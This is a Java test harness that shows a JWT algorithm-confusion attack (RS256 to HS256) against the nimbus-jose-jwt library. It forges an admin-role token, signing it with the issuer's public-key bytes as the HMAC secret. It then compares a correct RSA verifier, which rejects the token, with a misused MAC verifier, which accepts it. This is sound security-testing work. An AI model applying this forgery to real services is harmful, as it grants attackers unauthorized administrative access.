// Cross-language — Java nimbus-jose-jwt algorithm confusion (RS256->HS256).
// DY limit: attacker knows only the issuer's RSA PUBLIC key; forges an HS256
// role=admin token using the public key's encoded bytes as the MAC secret.
import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.*;
import com.nimbusds.jwt.*;
import java.security.*;
import java.security.interfaces.*;

public class Confusion {
  public static void main(String[] args) throws Exception {
    KeyPairGenerator g = KeyPairGenerator.getInstance("RSA");
    g.initialize(2048);
    KeyPair kp = g.generateKeyPair();
    RSAPublicKey pub = (RSAPublicKey) kp.getPublic();
    byte[] pubBytes = pub.getEncoded();          // X.509 DER (public, attacker has it)

    // forged HS256 token, MAC secret = public-key bytes, role=admin
    JWTClaimsSet claims = new JWTClaimsSet.Builder().claim("role", "admin").issuer("real-issuer").build();
    SignedJWT forged = new SignedJWT(new JWSHeader(JWSAlgorithm.HS256), claims);
    forged.sign(new MACSigner(pubBytes));
    String forgedStr = forged.serialize();

    System.out.println("======================================================================");
    System.out.println("nimbus-jose-jwt 9.40 — algorithm confusion (RS256->HS256)");
    System.out.println("======================================================================");

    int tp = 0;

    // (1) SAFE: verify with RSASSAVerifier holding the RSA public key
    boolean safeAccept = false;
    try {
      SignedJWT t = SignedJWT.parse(forgedStr);
      safeAccept = t.verify(new RSASSAVerifier(pub));
    } catch (Exception e) {}
    System.out.printf("  [%s] verify RSASSAVerifier(pub) (safe)     %s%n", safeAccept?"A":"OK", safeAccept?"ACCEPT":"REJECT");

    // (2) UNSAFE usage: app feeds the public-key bytes to a MACVerifier
    boolean vulnAccept = false; String role = "-";
    try {
      SignedJWT t = SignedJWT.parse(forgedStr);
      vulnAccept = t.verify(new MACVerifier(pubBytes));
      role = String.valueOf(t.getJWTClaimsSet().getClaim("role"));
    } catch (Exception e) {}
    if (vulnAccept && role.equals("admin")) tp = 1;
    System.out.printf("  [%s] verify MACVerifier(pubBytes) (unsafe) %s role=%s%n", (tp==1)?"A":"OK", vulnAccept?"ACCEPT":"REJECT", role);

    System.out.println("----------------------------------------------------------------------");
    System.out.printf("RESULT\tnimbus-jose-jwt 9.40\tconfusion_TP=%d\tnote=full-forgery-under-misuse%n", tp);
  }
}
